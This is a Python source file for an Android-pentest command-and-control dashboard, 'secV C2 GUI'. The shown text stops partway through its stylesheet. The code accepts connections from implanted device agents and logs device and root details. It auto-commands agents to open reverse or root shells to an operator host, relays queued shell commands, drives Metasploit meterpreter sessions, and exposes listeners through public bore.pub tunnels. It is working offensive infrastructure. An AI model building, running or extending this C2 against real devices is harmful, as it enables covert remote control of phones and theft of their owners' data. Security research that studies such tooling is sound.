#!/usr/bin/env python3
"""
secV C2 GUI
Web-based C2 dashboard for android_pentest. Manages secV agent sessions,
bore tunnels, MSF sessions, QR delivery, operation launcher, and session logs.

Standalone:
  python3 c2_gui.py [--port 8891] [--c2-port 8889] [--bore-dex-port 21062] ...

Via android_pentest:
  set c2_gui true; run
"""
import argparse, base64, gzip, hashlib, http.client, json, os, re, shutil
import signal, socket, subprocess, sys, threading, time
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path
from typing import Dict, List, Optional, Any
from urllib.parse import urlparse, parse_qs, unquote

# ── Optional: cryptography for .scv encryption ────────────────────────────────
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
    from cryptography.hazmat.primitives import hashes, hmac as _hmac
    from cryptography.hazmat.backends import default_backend
    import struct as _struct
    _HAS_FERNET = True
    _HAS_HAZMAT = True
except ImportError:
    _HAS_FERNET = False
    _HAS_HAZMAT = False

# ── Optional: qrcode for QR generation ────────────────────────────────────────
try:
    import qrcode as _qrcode
    import io as _io
    _HAS_QR = True
except ImportError:
    _HAS_QR = False

# ── Config defaults ────────────────────────────────────────────────────────────
SECV_HOME    = Path.home() / ".secv"
SESSION_DIR  = SECV_HOME / "sessions"
KEY_FILE     = SECV_HOME / ".scvkey"
MSF_CFG_FILE = SECV_HOME / "msf_rpc.json"

SECV_HOME.mkdir(exist_ok=True)
SESSION_DIR.mkdir(exist_ok=True)

# ── .scv Encryption — 5-layer scheme ──────────────────────────────────────────
#
# Standard auto-key format:  b"SCV1" + 4-byte ts + Fernet(gzip(json))
# Password-protected format: b"S5CV" + 4-byte ts + 16-byte scrypt_salt
#                            + 12-byte aes_nonce + 12-byte cha_nonce
#                            + AES-256-GCM tag (16 bytes, appended by AESGCM)
#                            + ChaCha20-Poly1305 ciphertext
#
# Key derivation (5 passes):
#   pass 1: PBKDF2-HMAC-SHA512, 200 000 iterations -> raw_1 (64 bytes)
#   pass 2: SHA3-512(raw_1 + salt) -> raw_2 (64 bytes)
#   pass 3: PBKDF2-HMAC-SHA256 using raw_2 as "password", 100 000 iters -> raw_3 (32 bytes)
#   pass 4: Scrypt(N=2^17, r=8, p=1) of raw_3 -> aes_key (32 bytes) + cha_key (32 bytes)
#   pass 5: HMAC-SHA512 of all previous material -> auth_tag stored in header
#
_SCV_MAGIC   = b"SCV1"  # auto-key
_SCV5_MAGIC  = b"S5CV"  # password-protected (5-layer)

def _get_or_make_key() -> bytes:
    if KEY_FILE.exists():
        return KEY_FILE.read_bytes().strip()
    if _HAS_FERNET:
        key = Fernet.generate_key()
        KEY_FILE.write_bytes(key)
        KEY_FILE.chmod(0o600)
        return key
    mid = Path("/etc/machine-id").read_text().strip()[:32] if Path("/etc/machine-id").exists() else "secv-c2-key"
    return base64.urlsafe_b64encode(hashlib.sha256(mid.encode()).digest())

_AUTO_KEY = _get_or_make_key()

def _derive_5layer(password: str, salt: bytes) -> tuple:
    """Return (aes_key, cha_key) from password + salt via 5-pass KDF."""
    if not _HAS_HAZMAT:
        # Fallback: SHA256 chain
        k = hashlib.sha256(password.encode() + salt).digest()
        for _ in range(4):
            k = hashlib.sha256(k + salt).digest()
        return k[:16], k[16:]  # weak fallback

    pw_b = password.encode()
    # Pass 1: PBKDF2-HMAC-SHA512
    kdf1 = PBKDF2HMAC(algorithm=hashes.SHA512(), length=64, salt=salt,
                       iterations=200_000, backend=default_backend())
    raw1 = kdf1.derive(pw_b)
    # Pass 2: SHA3-512
    raw2 = hashlib.sha3_512(raw1 + salt).digest()
    # Pass 3: PBKDF2-HMAC-SHA256 (using raw2 as "password")
    kdf3 = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt,
                       iterations=100_000, backend=default_backend())
    raw3 = kdf3.derive(raw2)
    # Pass 4: Scrypt (memory-hard)
    kdf4 = Scrypt(salt=salt, length=64, n=2**17, r=8, p=1, backend=default_backend())
    raw4 = kdf4.derive(raw3)
    aes_key = raw4[:32]
    cha_key = raw4[32:]
    return aes_key, cha_key

def scv_save_protected(data: dict, path: Path, password: str):
    """Save session to .scv with 5-layer password encryption."""
    plaintext = gzip.compress(json.dumps(data, default=str).encode())
    salt      = os.urandom(16)
    aes_nonce = os.urandom(12)
    cha_nonce = os.urandom(12)
    aes_key, cha_key = _derive_5layer(password, salt)

    if _HAS_HAZMAT:
        # AES-256-GCM inner layer
        layer1 = AESGCM(aes_key).encrypt(aes_nonce, plaintext, None)
        # ChaCha20-Poly1305 outer layer
        layer2 = ChaCha20Poly1305(cha_key).encrypt(cha_nonce, layer1, None)
    else:
        # Fallback: XOR + base64
        key = aes_key + cha_key
        layer2 = bytes(b ^ key[i % len(key)] for i, b in enumerate(plaintext))

    ts = int(time.time()).to_bytes(4, "big")
    path.write_bytes(_SCV5_MAGIC + ts + salt + aes_nonce + cha_nonce + layer2)
    path.chmod(0o600)

def scv_load_protected(path: Path, password: str) -> Optional[dict]:
    """Load and decrypt a 5-layer password-protected .scv file."""
    try:
        raw = path.read_bytes()
        if not raw.startswith(_SCV5_MAGIC):
            return None
        salt      = raw[8:24]
        aes_nonce = raw[24:36]
        cha_nonce = raw[36:48]
        ciphertext = raw[48:]
        aes_key, cha_key = _derive_5layer(password, salt)
        if _HAS_HAZMAT:
            layer1    = ChaCha20Poly1305(cha_key).decrypt(cha_nonce, ciphertext, None)
            plaintext = AESGCM(aes_key).decrypt(aes_nonce, layer1, None)
        else:
            key = aes_key + cha_key
            plaintext = bytes(b ^ key[i % len(key)] for i, b in enumerate(ciphertext))
        return json.loads(gzip.decompress(plaintext).decode())
    except Exception:
        return None

def scv_is_protected(path: Path) -> bool:
    try:
        return path.read_bytes(4) == _SCV5_MAGIC
    except Exception:
        return False

def scv_save(data: dict, path: Path):
    raw = gzip.compress(json.dumps(data, default=str).encode())
    if _HAS_FERNET:
        encrypted = Fernet(_AUTO_KEY).encrypt(raw)
    else:
        encrypted = base64.b64encode(raw)
    ts = int(time.time()).to_bytes(4, "big")
    path.write_bytes(_SCV_MAGIC + ts + encrypted)

def scv_load(path: Path) -> Optional[dict]:
    try:
        raw_bytes = path.read_bytes()
        if raw_bytes.startswith(_SCV5_MAGIC):
            return {"error": "password_required", "protected": True}
        if not raw_bytes.startswith(_SCV_MAGIC):
            return None
        payload = raw_bytes[8:]
        if _HAS_FERNET:
            decrypted = Fernet(_AUTO_KEY).decrypt(payload)
        else:
            decrypted = base64.b64decode(payload)
        return json.loads(gzip.decompress(decrypted).decode())
    except Exception:
        return None

def scv_timestamp(path: Path) -> int:
    try:
        raw = path.read_bytes()
        magic = raw[:4]
        if magic in (_SCV_MAGIC, _SCV5_MAGIC):
            return int.from_bytes(raw[4:8], "big")
    except Exception:
        pass
    return int(path.stat().st_mtime)

# ── Session store ──────────────────────────────────────────────────────────────
_sessions: Dict[str, Dict] = {}
_sessions_lock = threading.Lock()
_session_cmds: Dict[str, str] = {}  # addr -> pending command for TCP agent

def _register_session(addr: str, report: dict) -> str:
    dev = report.get("device", {})
    sid = f"{addr}-{datetime.now().strftime('%H%M%S')}"
    with _sessions_lock:
        existing = _sessions.get(addr, {})
        _sessions[addr] = {
            "id":         sid,
            "addr":       addr,
            "start_time": existing.get("start_time", datetime.now().isoformat()),
            "last_seen":  datetime.now().isoformat(),
            "report":     report,
            "model":      dev.get("model", "?"),
            "android":    dev.get("android", "?"),
            "sdk":        dev.get("sdk", "?"),
            "root":       dev.get("root", "none"),
            "root_bin":   dev.get("root_bin", ""),
            "ip":         report.get("network", {}).get("ip", addr.split(":")[0]),
            "patch":      dev.get("security_patch", ""),
            "chipset":    dev.get("chipset", ""),
            "agent":      report.get("agent", "?"),
            "mode":       report.get("mode", "recon"),
            "output":     existing.get("output", []),
            "cmd_history":existing.get("cmd_history", []),
            "active":     True,
        }
    return sid

def _close_session(addr: str):
    with _sessions_lock:
        sess = _sessions.get(addr)
        if not sess:
            return
        sess["active"] = False
        sess["end_time"] = datetime.now().isoformat()
    _save_session_scv(addr)

def _save_session_scv(addr: str):
    with _sessions_lock:
        sess = dict(_sessions.get(addr, {}))
    if not sess:
        return
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_addr = addr.replace(":", "_").replace(".", "-")
    fname = f"{ts}_{safe_addr}.scv"
    scv_save(sess, SESSION_DIR / fname)

def _append_output(addr: str, line: str):
    with _sessions_lock:
        sess = _sessions.get(addr)
        if sess:
            sess["output"].append({"t": datetime.now().strftime("%H:%M:%S"), "text": line})

# ── Bore process manager ───────────────────────────────────────────────────────
class BoreManager:
    def __init__(self):
        self._procs: Dict[str, subprocess.Popen] = {}
        self._http_procs: Dict[int, subprocess.Popen] = {}
        self._lock = threading.Lock()

    def start_tunnel(self, local_port: int, bore_port: int,
                     bore_server: str = "bore.pub") -> Dict:
        key = f"{local_port}:{bore_port}"
        with self._lock:
            proc = self._procs.get(key)
            if proc and proc.poll() is None:
                return {"ok": False, "error": "already running"}
            try:
                p = subprocess.Popen(
                    ["bore", "local", str(local_port), "--to", bore_server,
                     "--port", str(bore_port)],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, bufsize=1
                )
                self._procs[key] = p
                return {"ok": True, "pid": p.pid, "key": key,
                        "url": f"bore.pub:{bore_port}"}
            except FileNotFoundError:
                return {"ok": False, "error": "bore binary not found"}
            except Exception as e:
                return {"ok": False, "error": str(e)}

    def stop_tunnel(self, local_port: int, bore_port: int) -> Dict:
        key = f"{local_port}:{bore_port}"
        with self._lock:
            proc = self._procs.pop(key, None)
        if proc and proc.poll() is None:
            proc.terminate()
            return {"ok": True}
        return {"ok": False, "error": "not running"}

    def start_http(self, directory: str, port: int = 8080) -> Dict:
        with self._lock:
            proc = self._http_procs.get(port)
            if proc and proc.poll() is None:
                return {"ok": False, "error": "already running"}
            d = Path(directory)
            if not d.exists():
                d.mkdir(parents=True, exist_ok=True)
            try:
                p = subprocess.Popen(
                    ["python3", "-m", "http.server", str(port),
                     "--directory", str(d)],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
                self._http_procs[port] = p
                return {"ok": True, "pid": p.pid, "port": port, "dir": str(d)}
            except Exception as e:
                return {"ok": False, "error": str(e)}

    def stop_http(self, port: int) -> Dict:
        with self._lock:
            proc = self._http_procs.pop(port, None)
        if proc and proc.poll() is None:
            proc.terminate()
            return {"ok": True}
        return {"ok": False, "error": "not running"}

    def status(self) -> List[Dict]:
        result = []
        with self._lock:
            dead_keys = []
            for key, proc in self._procs.items():
                alive = proc.poll() is None
                lp, bp = key.split(":")
                result.append({
                    "type": "bore", "key": key,
                    "local_port": int(lp), "bore_port": int(bp),
                    "running": alive, "pid": proc.pid
                })
                if not alive:
                    dead_keys.append(key)
            for k in dead_keys:
                del self._procs[k]
            for port, proc in self._http_procs.items():
                alive = proc.poll() is None
                result.append({
                    "type": "http", "port": port,
                    "running": alive, "pid": proc.pid
                })
        return result

    def cleanup(self):
        with self._lock:
            for p in list(self._procs.values()) + list(self._http_procs.values()):
                if p.poll() is None:
                    p.terminate()
            self._procs.clear()
            self._http_procs.clear()

_bore = BoreManager()

# ── Background job runner (for operations) ────────────────────────────────────
_jobs: Dict[str, Dict] = {}
_jobs_lock = threading.Lock()

def _run_job(job_id: str, cmd: List[str], cwd: Optional[str] = None):
    with _jobs_lock:
        _jobs[job_id] = {"status": "running", "output": [], "started": datetime.now().isoformat()}
    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1, cwd=cwd
        )
        with _jobs_lock:
            _jobs[job_id]["pid"] = proc.pid
        for line in proc.stdout:
            with _jobs_lock:
                _jobs[job_id]["output"].append(line.rstrip())
        proc.wait()
        with _jobs_lock:
            _jobs[job_id]["status"] = "done"
            _jobs[job_id]["returncode"] = proc.returncode
            _jobs[job_id]["ended"] = datetime.now().isoformat()
    except Exception as e:
        with _jobs_lock:
            _jobs[job_id]["status"] = "error"
            _jobs[job_id]["output"].append(f"Error: {e}")

def start_job(cmd: List[str], cwd: Optional[str] = None) -> str:
    job_id = hashlib.md5(f"{cmd}{time.time()}".encode()).hexdigest()[:8]
    t = threading.Thread(target=_run_job, args=(job_id, cmd, cwd), daemon=True)
    t.start()
    return job_id

# ── MSF RPC client (minimal, connects to msfrpcd) ─────────────────────────────
class MSFClient:
    def __init__(self):
        self._cfg: Optional[Dict] = None
        self._token: str = ""
        self._load_cfg()

    def _load_cfg(self):
        if MSF_CFG_FILE.exists():
            try:
                self._cfg = json.loads(MSF_CFG_FILE.read_text())
            except Exception:
                pass

    def _rpc(self, method: str, params: list = None) -> Optional[Dict]:
        if not self._cfg:
            return None
        host = self._cfg.get("host", "127.0.0.1")
        port = self._cfg.get("port", 55553)
        password = self._cfg.get("password", self._cfg.get("pass", ""))
        if not self._token:
            try:
                conn = http.client.HTTPConnection(host, port, timeout=5)
                body = json.dumps(["auth.login", password]).encode()
                conn.request("POST", "/api/", body, {"Content-Type": "application/json"})
                resp = json.loads(conn.getresponse().read())
                self._token = resp.get("token", "")
            except Exception:
                return None
        try:
            call = [method, self._token] + (params or [])
            conn = http.client.HTTPConnection(host, port, timeout=5)
            body = json.dumps(call).encode()
            conn.request("POST", "/api/", body, {"Content-Type": "application/json"})
            return json.loads(conn.getresponse().read())
        except Exception:
            return None

    def sessions(self) -> List[Dict]:
        resp = self._rpc("session.list")
        if not resp or "sessions" not in resp:
            return []
        raw = resp["sessions"]
        if isinstance(raw, dict):
            return [{"id": k, **v} for k, v in raw.items()]
        return []

    def run_cmd(self, session_id: str, cmd: str) -> Optional[str]:
        resp = self._rpc("session.meterpreter_run_single", [session_id, cmd])
        if not resp:
            return None
        return resp.get("result", "")

    def connected(self) -> bool:
        return bool(self._cfg and self._rpc("core.version"))

_msf = MSFClient()

# ── TCP agent listener ─────────────────────────────────────────────────────────
def _handle_agent_conn(conn: socket.socket, addr_str: str,
                       auto_exploit: bool, lhost: str, lport: int):
    try:
        buf = b""
        conn.settimeout(10)
        while True:
            try:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                buf += chunk
                if b"\n" in buf:
                    line, buf = buf.split(b"\n", 1)
                    try:
                        report = json.loads(line.decode())
                        _register_session(addr_str, report)
                        _append_output(addr_str, f"[connected] {report.get('device', {}).get('model', '?')}")
                        if auto_exploit:
                            mode = report.get("mode", "recon")
                            dev  = report.get("device", {})
                            if mode in ("exploit", "c2"):
                                cmd = f"ROOT_SHELL:{lhost}:{lport}" if "rooted" in dev.get("root","") else f"SHELL:{lhost}:{lport}"
                                conn.sendall((cmd + "\n").encode())
                                _session_cmds[addr_str] = cmd
                        break
                    except json.JSONDecodeError:
                        pass
            except socket.timeout:
                break
        # Wait for pending command from GUI
        conn.settimeout(30)
        deadline = time.time() + 30
        while time.time() < deadline:
            cmd = _session_cmds.pop(addr_str, None)
            if cmd:
                conn.sendall((cmd + "\n").encode())
                _append_output(addr_str, f"> {cmd}")
                # Read response
                resp_buf = b""
                conn.settimeout(10)
                while True:
                    try:
                        chunk = conn.recv(4096)
                        if not chunk:
                            break
                        resp_buf += chunk
                        if resp_buf.endswith(b"---END---\n") or resp_buf.endswith(b"---END---"):
                            break
                    except socket.timeout:
                        break
                out = resp_buf.decode("utf-8", errors="replace").replace("---END---", "").strip()
                _append_output(addr_str, out)
                deadline = time.time() + 30
            time.sleep(0.5)
    except Exception:
        pass
    finally:
        conn.close()
        _close_session(addr_str)

def _tcp_server(port: int, auto_exploit: bool, lhost: str, lport: int):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind(("0.0.0.0", port))
        srv.listen(10)
        while True:
            try:
                conn, addr_tuple = srv.accept()
                addr = f"{addr_tuple[0]}:{addr_tuple[1]}"
                t = threading.Thread(
                    target=_handle_agent_conn,
                    args=(conn, addr, auto_exploit, lhost, lport),
                    daemon=True
                )
                t.start()
            except Exception:
                pass
    except Exception as e:
        print(f"[c2_gui] TCP server error: {e}")

# ── HTML template ──────────────────────────────────────────────────────────────
def _html(cfg: Dict) -> str:
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>secV C2</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=JetBrains+Mono:ital,wght@0,300;0,400;0,500;1,300&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{{margin:0;padding:0;box-sizing:border-box}}
html{{scroll-behavior:smooth;-webkit-font-smoothing:antialiased}}
:root{{
  --bg:#060606;--bg1:#0e0e0e;--bg2:#161616;--bg3:#1e1e1e;--bg4:#282828;
  --border:rgba(255,255,255,0.06);--border2:rgba(255,255,255,0.12);--border3:rgba(255,255,255,0.22);
  --text:#a2a2a2;--muted:#4e4e4e;--dim:#242424;--white:#efefef;--off:#cccccc;--grey:#727272;
  --mono:'JetBrains Mono',monospace;--disp:'Syne',sans-serif;--t:0.15s ease;
}}
body{{font-family:var(--mono);background:var(--bg);color:var(--text);line-height:1.7;overflow-x:hidden;min-height:100vh}}
::-webkit-scrollbar{{width:4px}}::-webkit-scrollbar-track{{background:var(--bg)}}::-webkit-scrollbar-thumb{{background:var(--bg3);border-radius:2px}}
/* Nav */
nav{{position:fixed;top:0;left:0;right:0;z-index:100;height:52px;display:flex;align-items:center;
  justify-content:space-between;padding:0 2.5rem;border-bottom:1px solid transparent;
  transition:border-color 0.3s,background 0.3s}}
nav.scrolled{{background:rgba(6,6,6,0.96);backdrop-filter:blur(16px);border-color:var(--border)}}
.logo{{font-family:var(--disp);font-size:0.92rem;font-weight:800;color:var(--white);
  text-decoration:none;letter-spacing:-0.02em;display:flex;align-items:center;gap:0.5rem}}
.logo-sep{{color:var(--muted);font-weight:400}}
.logo-sub{{color:var(--grey);font-weight:400;font-size:0.82rem}}
.nav-links{{display:flex;align-items:center;gap:0.25rem}}
.nav-link{{font-size:0.6rem;letter-spacing:0.1em;text-transform:uppercase;color:var(--muted);
  text-decoration:none;padding:0.4rem 0.75rem;transition:color var(--t);cursor:pointer;
  background:none;border:none;font-family:var(--mono)}}
.nav-link:hover{{color:var(--text)}}
.nav-link.active{{color:var(--white)}}
.nav-btn{{font-size:0.6rem;letter-spacing:0.1em;text-transform:uppercase;color:var(--text);
  text-decoration:none;padding:0.4rem 0.9rem;border:1px solid var(--border2);margin-left:0.5rem;
  transition:border-color var(--t),color var(--t);background:none;font-family:var(--mono);cursor:pointer}}
.nav-btn:hover{{border-color:var(--border3);color:var(--white)}}
.nav-status{{display:flex;align-items:center;gap:1.25rem;margin-left:1rem}}
.ns-item{{display:flex;align-items:center;gap:0.35rem;font-size:0.52rem;letter-spacing:0.08em;
  text-transform:uppercase;color:var(--muted)}}
.ns-dot{{width:5px;height:5px;border-radius:50%;background:var(--muted);flex-shrink:0}}
.ns-dot.on{{background:#5a7a5a}}
.burger{{display:none;background:none;border:1px solid var(--border2);padding:0.38rem 0.55rem;
  cursor:pointer;flex-direction:column;gap:4px;border-radius:2px}}
.burger span{{display:block;width:18px;height:1px;background:var(--text);transition:transform var(--t),opacity var(--t)}}
body.nav-open .burger span:nth-child(1){{transform:rotate(45deg) translate(3.5px,3.5px)}}
body.nav-open .burger span:nth-child(2){{opacity:0}}
body.nav-open .burger span:nth-child(3){{transform:rotate(-45deg) translate(3.5px,-3.5px)}}
/* Sections */
.tab-section{{display:none;max-width:1020px;margin:0 auto;padding:5.5rem 2.5rem 5rem;animation:rise 0.3s ease both}}
.tab-section.active{{display:block}}
@keyframes rise{{from{{opacity:0;transform:translateY(8px)}}to{{opacity:1;transform:none}}}}
.rule{{border:none;border-top:1px solid var(--border);margin:3rem 0}}
.section-label{{font-size:0.5rem;letter-spacing:0.24em;text-transform:uppercase;color:var(--muted);
  margin-bottom:0.6rem;display:flex;align-items:center;gap:0.75rem}}
.section-label::before{{content:'';display:inline-block;width:20px;height:1px;background:var(--muted)}}
h2{{font-family:var(--disp);font-size:clamp(1.5rem,3vw,2.2rem);font-weight:800;
  letter-spacing:-0.04em;color:var(--white);margin-bottom:1.5rem}}
h3{{font-family:var(--disp);font-size:1.05rem;font-weight:700;letter-spacing:-0.02em;
  color:var(--white);margin-bottom:0.85rem;margin-top:2rem}}
.body-text{{font-size:0.78rem;color:var(--text);line-height:1.9;margin-bottom:1.6rem;max-width:760px}}
/* Module card grid (sessions) */
.module-grid{{display:grid;grid-template-columns:repeat(auto-fill,minmax(290px,1fr));
  gap:1px;background:var(--border);border:1px solid var(--border);margin-bottom:2rem}}
.module-card{{background:var(--bg);padding:1.6rem;position:relative;transition:background var(--t);
  cursor:pointer;overflow:hidden}}
.module-card::before{{content:'';position:absolute;left:0;top:0;bottom:0;width:2px;
  background:var(--white);opacity:0;transition:opacity 0.2s}}
.module-card:hover{{background:var(--bg1)}}
.module-card:hover::before{{opacity:1}}
.module-card.selected{{background:var(--bg1)}}
.module-card.selected::before{{opacity:1}}
.module-card.offline::before{{background:var(--grey)}}
.mod-status{{font-size:0.48rem;letter-spacing:0.16em;text-transform:uppercase;
  padding:0.12rem 0.45rem;display:inline-flex;align-items:center;gap:0.4rem;
  margin-bottom:0.85rem;border:1px solid transparent}}
.mod-status::before{{content:'';display:inline-block;width:5px;height:5px;border-radius:50%;flex-shrink:0}}
.status-stable{{color:var(--off);border-color:var(--border2);background:rgba(255,255,255,0.04)}}
.status-stable::before{{background:var(--white)}}
.status-beta{{color:#b89a48;border-color:rgba(184,154,72,0.2);background:rgba(184,154,72,0.06)}}
.status-beta::before{{background:#b89a48}}
.status-wip{{color:var(--muted);border-color:var(--border)}}
.status-wip::before{{background:var(--muted)}}
.mod-name{{font-family:var(--disp);font-size:1.1rem;font-weight:700;color:var(--white);
  margin-bottom:0.3rem;letter-spacing:-0.02em}}
.mod-addr{{font-size:0.66rem;color:var(--grey);margin-bottom:0.7rem}}
.mod-desc{{font-size:0.74rem;color:var(--text);line-height:1.7;margin-bottom:1rem}}
.mod-tags{{display:flex;flex-wrap:wrap;gap:0.3rem}}
.tag{{font-size:0.46rem;letter-spacing:0.1em;text-transform:uppercase;color:var(--muted);
  padding:0.12rem 0.5rem;border:1px solid var(--border);transition:border-color var(--t),color var(--t)}}
.module-card:hover .tag{{border-color:var(--border2)}}
.mod-arrow{{position:absolute;right:1.25rem;bottom:1.25rem;font-size:0.78rem;color:var(--muted);
  opacity:0;transition:opacity 0.15s,transform 0.15s}}
.module-card:hover .mod-arrow{{opacity:1;transform:translateX(4px)}}
/* Install block (for URLs) */
.install-block{{display:flex;align-items:center;background:var(--bg1);border:1px solid var(--border2);
  max-width:640px;margin-bottom:1.5rem;overflow:hidden}}
.install-label{{font-size:0.5rem;letter-spacing:0.16em;text-transform:uppercase;color:var(--muted);
  padding:0.75rem 1rem;border-right:1px solid var(--border2);white-space:nowrap;flex-shrink:0}}
.install-cmd{{font-size:0.74rem;color:var(--white);padding:0.75rem 1.1rem;flex:1;
  overflow:hidden;white-space:nowrap;text-overflow:ellipsis}}
.install-copy{{background:none;border:none;border-left:1px solid var(--border2);
  padding:0.75rem 0.9rem;cursor:pointer;color:var(--muted);
  transition:color var(--t),background var(--t);flex-shrink:0;font-size:0.7rem}}
.install-copy:hover{{color:var(--white);background:var(--bg2)}}
/* Chain */
.chain{{display:flex;flex-direction:column;gap:0;border:1px solid var(--border);margin:1.5rem 0 2rem}}
.chain-step{{display:grid;grid-template-columns:2.5rem 1fr;gap:1rem;padding:1rem 1.2rem;
  border-bottom:1px solid var(--border);align-items:start;background:var(--bg);transition:background var(--t)}}
.chain-step:last-child{{border-bottom:none}}
.chain-step:hover{{background:var(--bg1)}}
.chain-num{{font-family:var(--disp);font-size:0.7rem;font-weight:800;color:var(--muted);
  letter-spacing:-0.02em;padding-top:0.1rem}}
.chain-title{{font-size:0.76rem;font-weight:600;color:var(--white);margin-bottom:0.2rem}}
.chain-body{{font-size:0.68rem;color:var(--muted);line-height:1.65}}
.chain-code{{font-family:var(--mono);font-size:0.64rem;color:var(--off);
  background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem}}
/* Info grid */
.info-grid{{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));
  gap:1px;background:var(--border);border:1px solid var(--border);margin:1rem 0 2rem}}
.info-card{{background:var(--bg);padding:1.2rem 1.4rem}}
.info-card-num{{font-family:var(--disp);font-size:1.5rem;font-weight:800;color:var(--dim);
  letter-spacing:-0.04em;margin-bottom:0.3rem}}
.info-card-title{{font-size:0.68rem;font-weight:600;color:var(--white);margin-bottom:0.25rem}}
.info-card-body{{font-size:0.62rem;color:var(--muted);line-height:1.6}}
/* Code/pre */
pre{{background:var(--bg1);border:1px solid var(--border);border-left:3px solid var(--border2);
  padding:1rem 1.25rem;font-size:0.74rem;overflow-x:auto;color:var(--text);
  margin:0.75rem 0 1.5rem;line-height:1.75;border-radius:0 2px 2px 0}}
code{{font-family:var(--mono)}}
/* Terminal */
.terminal{{background:var(--bg1);border:1px solid var(--border);border-left:3px solid var(--border2);
  padding:1rem 1.25rem;font-size:0.73rem;height:320px;overflow-y:auto;
  font-family:var(--mono);color:var(--text);line-height:1.75}}
.t-line{{padding:1px 0;display:flex;gap:0.6rem}}
.t-ts{{color:var(--muted);font-size:0.58rem;flex-shrink:0;padding-top:0.06rem}}
.t-cmd .t-text{{color:var(--off)}}
.t-sys .t-text{{color:var(--muted)}}
.t-err .t-text{{color:#aa5555}}
/* Forms */
.form-row{{display:flex;align-items:center;gap:1rem;margin-bottom:0.85rem;flex-wrap:wrap}}
.form-label{{font-size:0.5rem;letter-spacing:0.14em;text-transform:uppercase;color:var(--muted);min-width:110px}}
.form-input{{font-family:var(--mono);font-size:0.73rem;background:var(--bg1);
  border:1px solid var(--border2);color:var(--white);padding:0.5rem 0.8rem;
  outline:none;transition:border-color var(--t)}}
.form-input:focus{{border-color:var(--border3)}}
.form-select{{font-family:var(--mono);font-size:0.73rem;background:var(--bg1);
  border:1px solid var(--border2);color:var(--white);padding:0.5rem 0.8rem;outline:none}}
/* Buttons */
.btn{{font-family:var(--mono);font-size:0.58rem;letter-spacing:0.1em;text-transform:uppercase;
  padding:0.42rem 0.95rem;border:1px solid var(--border2);background:none;color:var(--text);
  cursor:pointer;transition:border-color var(--t),color var(--t)}}
.btn:hover{{border-color:var(--border3);color:var(--white)}}
.btn.primary{{border-color:var(--off);color:var(--off)}}
.btn.primary:hover{{background:var(--white);color:var(--bg);border-color:var(--white)}}
.btn.danger{{border-color:rgba(170,85,85,0.4);color:#aa5555}}
.btn.danger:hover{{background:#aa5555;color:var(--white);border-color:#aa5555}}
.btn:disabled{{opacity:0.3;cursor:not-allowed}}
.btn+.btn{{margin-left:0.35rem}}
.btn-row{{display:flex;gap:0.35rem;flex-wrap:wrap;margin-top:1.25rem}}
/* Callout */
.callout{{border:1px solid var(--border2);border-left:3px solid var(--white);background:var(--bg1);
  padding:0.85rem 1.2rem;font-size:0.72rem;color:var(--text);line-height:1.8;margin:1.2rem 0 1.8rem}}
.callout strong{{color:var(--white)}}
/* Two-col */
.two-col{{display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;margin:1.5rem 0 2rem}}
.col-card{{background:var(--bg1);border:1px solid var(--border);padding:1.4rem}}
.col-card-title{{font-size:0.58rem;letter-spacing:0.14em;text-transform:uppercase;color:var(--muted);
  margin-bottom:0.85rem;padding-bottom:0.6rem;border-bottom:1px solid var(--border)}}
/* Op selection */
.op-row{{display:flex;flex-wrap:wrap;gap:1px;background:var(--border);border:1px solid var(--border);margin-bottom:1.5rem}}
.op-item{{background:var(--bg);padding:0.65rem 1rem;font-size:0.62rem;letter-spacing:0.06em;
  cursor:pointer;transition:background var(--t),color var(--t);color:var(--muted);text-transform:uppercase}}
.op-item:hover{{background:var(--bg1);color:var(--text)}}
.op-item.active{{background:var(--bg2);color:var(--white);border-left:2px solid var(--white)}}
/* Notifications */
#notify{{position:fixed;top:62px;right:1.5rem;z-index:9998;display:flex;flex-direction:column;gap:0.4rem}}
.notif{{font-size:0.65rem;background:var(--bg2);border:1px solid var(--border2);
  padding:0.5rem 1.1rem;color:var(--text);animation:slideIn 0.2s ease;max-width:300px}}
.notif.ok{{border-left:2px solid #5a7a5a;color:var(--off)}}
.notif.err{{border-left:2px solid #aa5555;color:#cc8888}}
@keyframes slideIn{{from{{opacity:0;transform:translateX(16px)}}to{{opacity:1;transform:none}}}}
/* Password modal */
#pw-modal{{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.85);z-index:9999;
  align-items:center;justify-content:center}}
.pw-box{{background:var(--bg1);border:1px solid var(--border2);border-left:3px solid var(--white);
  padding:2.25rem;min-width:400px;max-width:90vw;animation:rise 0.25s ease both}}
.pw-title{{font-family:var(--disp);font-weight:800;font-size:1.05rem;color:var(--white);
  letter-spacing:-0.03em;margin-bottom:0.25rem}}
.pw-sub{{font-size:0.62rem;color:var(--muted);margin-bottom:1.75rem;line-height:1.65}}
/* Log list */
.log-list{{border:1px solid var(--border)}}
.log-row{{display:flex;align-items:center;justify-content:space-between;
  padding:0.75rem 1rem;border-bottom:1px solid var(--border);transition:background var(--t)}}
.log-row:last-child{{border-bottom:none}}
.log-row:hover{{background:var(--bg1)}}
.log-name{{font-size:0.73rem;color:var(--off)}}
.log-meta{{font-size:0.58rem;color:var(--muted);margin-top:0.15rem}}
/* QR */
